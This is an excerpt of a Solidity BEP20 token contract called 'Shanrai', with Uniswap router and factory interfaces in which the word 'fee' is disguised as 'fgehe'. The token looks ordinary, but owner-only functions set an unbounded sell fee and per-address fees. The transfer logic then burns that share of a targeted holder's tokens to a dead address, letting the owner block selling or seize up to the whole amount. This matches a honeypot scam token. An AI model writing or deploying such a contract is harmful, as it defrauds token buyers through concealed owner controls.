...
interface IUniswapV2Factory {
    ...
    function fgeheTo() external view returns (address);
    function fgeheToSetter() external view returns (address);
    ...
    function setfgeheTo(address) external;
    function setfgeheToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfgeheOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfgeheOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfgeheOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfgeheOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfgeheOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Shanrai is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfgehe = 0;

    uint256 private _defaultBuyfgehe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfgehe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfgehe = _value;
    }

    function setSlipfgehe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfgehe[_address] = _value;
    }

    function getSlipfgehe(address _address) external view onlyownar returns (uint256) {
        return _slipfgehe[_address];
    }


    function setMAccountfgehe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfgehe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefgeheAmount = 0;

        if (rF) {
            uint256 tradefgehe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefgehe = _defaultSellfgehe;
                }
                if (from == uniswapV2Pair) {

                    tradefgehe = _defaultBuyfgehe;
                }
            }
            if (_slipfgehe[from] > 0) {
                tradefgehe = _slipfgehe[from];
            }

            tradefgeheAmount = _Amount.mul(tradefgehe).div(100);
        }


        if (tradefgeheAmount > 0) {
            _balances[from] = _balances[from].sub(tradefgeheAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefgeheAmount);
            emit Transfer(from, _deadAddress, tradefgeheAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefgeheAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefgeheAmount);
        emit Transfer(from, _to, _Amount - tradefgeheAmount);
    }
